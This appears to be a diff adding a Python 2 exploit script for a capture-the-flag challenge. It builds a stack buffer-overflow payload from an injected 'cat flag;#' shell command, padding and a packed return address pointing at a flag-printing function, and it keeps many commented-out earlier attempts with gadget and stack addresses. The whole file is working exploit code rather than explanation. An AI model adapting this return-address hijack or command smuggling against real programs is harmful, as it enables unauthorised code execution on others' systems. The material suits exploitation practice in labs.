@@ -1,0 +1,75 @@
+#!/usr/bin/python2
+
+import os
+import struct
+
+# Addresses
+pop_ret = 0x080b4eab
+print_flag = 0x080488e0
+cat_flag = 0x0804fc10
+# Overflow
+#payload = "A"*0x70
+#payload = ""
+#payload = "\x10\xfc\x04\x08"*0x20
+payload = "cat flag;#"
+
+payload += "A"*0x66
+
+#for i in range(100):
+#    payload = struct.pack("I", cat_flag)
+
+#payload = ""
+#for i in range(28):
+#   payload += struct.pack("I", 0x0000000d)
+
+#payload += "BBBB"
+#payload += "\xe0\x88\x04\x08"
+#payload += "\x00"*0x7
+
+# Gadget
+
+#ebp 0xffffd068
+
+payload += struct.pack("I", cat_flag)
+
+#payload += "0000" #*0x2
+#payload += "0"*0x1
+
+#payload += struct.pack("I", 0x00000000)
+
+#payload += "\x90\x90\x90\x90"
+#payload += "CCCCC"
+
+#payload += struct.pack("I", pop_ret)
+#value = 0xd
+#payload += struct.pack("I", value)
+
+#payload += struct.pack("I", 0x0000000d)
+
+#payload += struct.pack("d", 13)
+#payload += struct.pack("d", 13)
+
+#payload += struct.pack("I", 0xffffcc5e)
+
+#payload += struct.pack("I", 0xffffcc5e)
+
+#payload += "\x90"
+
+#payload += "BBBB"*10
+#payload += struct.pack("I", 0xffffcc5e)
+
+#payload += struct.pack("I", 0x49494949)
+#payload += struct.pack("I", 0x42424242)
+
+#payload += "\x0d"
+#payload += struct.pack("I", 0x0000000d)
+
+#payload += struct.pack('I', 0xffffcc50)
+
+#payload += struct.pack('I', 0x0000000d)
+
+print("%s" % payload)
+
+#payload += struct.pack("I", 0x080489c7)
+#os.system("a.out %s" % payload)
+#print(payload)
